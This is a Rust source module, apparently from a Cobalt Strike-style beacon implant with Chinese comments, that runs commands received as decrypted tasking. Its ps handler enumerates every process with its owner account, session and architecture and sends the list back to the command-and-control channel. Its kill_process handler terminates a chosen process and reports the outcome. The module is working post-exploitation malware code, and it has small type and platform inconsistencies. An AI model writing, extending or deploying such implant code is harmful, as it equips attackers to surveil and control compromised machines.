use std::ffi::{CStr, CString};
use std::io::Cursor;
use std::os::windows::raw::HANDLE;
use std::ptr::null_mut;

use sysinfo::{Pid, ProcessesToUpdate};
use windows_sys::core::PCSTR;
use windows_sys::Win32::Foundation::{GetLastError, BOOL};
use windows_sys::Win32::Security::Authorization::ConvertStringSidToSidA;
use windows_sys::Win32::Security::{LookupAccountSidA, PSID, SID_NAME_USE};
use windows_sys::Win32::System::RemoteDesktop::ProcessIdToSessionId;
use windows_sys::Win32::System::Threading::{
    IsWow64Process, OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};

use crate::util::data_parse::{beacon_read_i32, beacon_send_result};
use crate::util::jobs::{CALLBACK_PENDING, CALLBACK_PROCESS_LIST};
use crate::BEACON;

pub fn ps(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let callback_type = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let mut system = sysinfo::System::new_all();
    system.refresh_all();

    let mut result = String::new();

    for (pid, process) in system.processes() {
        let ppid = process.parent().unwrap_or(Pid::from(0)); // 父进程 ID
        let name = process.name().to_str().unwrap(); // 进程名称

        // 获取用户 ID，处理 SID
        let owner_sid = process
            .user_id()
            .map_or("unknown".to_string(), |uid| uid.to_string());
        let owner = get_username_from_sid(&owner_sid).unwrap_or("unknown".to_string()); // 根据 SID 获取用户名

        // 获取会话 ID
        let session_id = get_process_session_id(pid.as_u32()).unwrap_or(0); // 获取会话 ID

        // 获取架构信息
        let arch_string = get_process_arch(pid.as_u32()); // 获取架构信息

        // 使用 format! 宏构建结果字符串
        result.push_str(&format!(
            "\n{}\t{}\t{}\t{}\t{}\t{}",
            name, ppid, pid, arch_string, owner, session_id
        ));
    }
    let result = result.into_bytes();
    let mut result_bytes: Vec<u8> = callback_type.to_be_bytes().to_vec();
    result_bytes.extend_from_slice(&result);
    if callback_type == 0 {
        beacon_send_result(&result_bytes, &BEACON, CALLBACK_PROCESS_LIST).unwrap();
    } else {
        beacon_send_result(&result_bytes, &BEACON, CALLBACK_PENDING).unwrap()
    }
}

#[cfg(target_os = "windows")]
fn get_process_session_id(pid: u32) -> Option<u32> {
    let mut session_id: u32 = 0;

    // 调用 ProcessIdToSessionId 获取会话 ID
    let result = unsafe { ProcessIdToSessionId(pid, &mut session_id) };

    if result != 0 {
        // 直接检查返回值
        Some(session_id) // 成功获取会话 ID
    } else {
        None // 获取会话 ID 失败
    }
}

#[cfg(target_os = "linux")]
fn get_process_session_id(_pid: i32) -> Option<u32> {
    // Linux 平台实现 (通过解析 /proc 文件系统)
    use std::fs;
    let path = format!("/proc/{}/sessionid", _pid);
    if let Ok(contents) = fs::read_to_string(path) {
        if let Ok(session_id) = contents.trim().parse() {
            return Some(session_id);
        }
    }
    None
}

#[cfg(target_os = "windows")]
fn get_process_arch(pid: u32) -> &'static str {
    unsafe {
        // 打开进程以获取信息
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            BOOL::from(false),
            pid,
        );
        if handle == 0 as HANDLE {
            return "unknown"; // 处理失败，返回 "unknown"
        }

        let mut is_wow64: i32 = 0; // 使用 i32 作为变量类型
        let result = IsWow64Process(handle, &mut is_wow64);

        // 检查 IsWow64Process 函数是否成功
        if result != 0 {
            if is_wow64 != 0 {
                "x86" // 32 位
            } else {
                "x64" // 64 位
            }
        } else {
            "unknown" // 如果获取架构失败，返回 "unknown"
        }
    }
}
#[cfg(target_os = "linux")]
fn get_process_arch(pid: u32) -> &'static str {
    use std::fs;
    use std::process::Command;

    let exe_path = format!("/proc/{}/exe", pid);
    if let Ok(output) = Command::new("file").arg(exe_path).output() {
        let output_str = String::from_utf8_lossy(&output.stdout);
        if output_str.contains("64-bit") {
            return "x64";
        } else if output_str.contains("32-bit") {
            return "x86";
        }
    }
    "unknown"
}

fn get_username_from_sid(sid: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        // 创建 CString，确保 SID 字符串格式正确
        let c_sid = CString::new(sid).map_err(|_| "Failed to create CString")?;

        let mut p_sid: *mut std::ffi::c_void = null_mut();

        // 将 SID 字符串转换为 PSID
        let result =
            unsafe { ConvertStringSidToSidA(c_sid.as_ptr() as PCSTR, &mut p_sid as *mut _) };

        if result == 0 {
            return Err(format!(
                "ConvertStringSidToSidA failed with error code: {}",
                unsafe { GetLastError() }
            ));
        }
        let mut account_name = vec![0; 256]; // 存储用户名
        let mut domain_name = vec![0; 256]; // 存储域名
        let mut account_name_size = account_name.len() as u32;
        let mut domain_name_size = domain_name.len() as u32;
        let mut use_type = 0 as SID_NAME_USE; // SID 名称类型

        let result = unsafe {
            LookupAccountSidA(
                null_mut(),                // 使用本地计算机
                p_sid as PSID,             // SID 指针
                account_name.as_mut_ptr(), // 用户名缓冲区
                &mut account_name_size,    // 用户名大小
                domain_name.as_mut_ptr(),  // 域名缓冲区
                &mut domain_name_size,     // 域名大小
                &mut use_type,             // SID 名称类型
            )
        };

        unsafe {
            if result != 0 {
                let username = CStr::from_ptr(account_name.as_ptr() as *const i8)
                    .to_string_lossy()
                    .into_owned();
                let domain = CStr::from_ptr(domain_name.as_ptr() as *const i8)
                    .to_string_lossy()
                    .into_owned();

                // 格式化为 "domain\username"
                let formatted_username = format!("{}\\{}", domain, username);
                Ok(formatted_username)
            } else {
                let error_code = unsafe { GetLastError() };
                Err(format!(
                    "Failed to lookup account SID. Error: {}",
                    error_code
                ))
            }
        }
    }
}

pub fn kill_process(mut decrypted_cursor: Cursor<Vec<u8>>) {
    let _ = beacon_read_i32(&mut decrypted_cursor);
    let pid = beacon_read_i32(&mut decrypted_cursor).unwrap();

    // 创建系统信息对象
    let mut sys = sysinfo::System::new_all();
    let processes_to_update = ProcessesToUpdate::All; // 获取所有进程
    sys.refresh_processes(processes_to_update); // 刷新进程信息

    // 查找并杀死指定 PID 的进程
    if let Some(process) = sys.process(Pid::from(pid as usize)) {
        match process.kill() {
            true => {
                // 杀死进程成功
                let result = format!("ok,process {} killed", pid);
                beacon_send_result(&result.as_bytes(), &BEACON, CALLBACK_PENDING).unwrap();
            }
            false => {
                // 杀死进程失败
                let result = format!("process {} not found", pid);
                beacon_send_result(&result.as_bytes(), &BEACON, CALLBACK_PENDING).unwrap();
            }
        }
    }
}
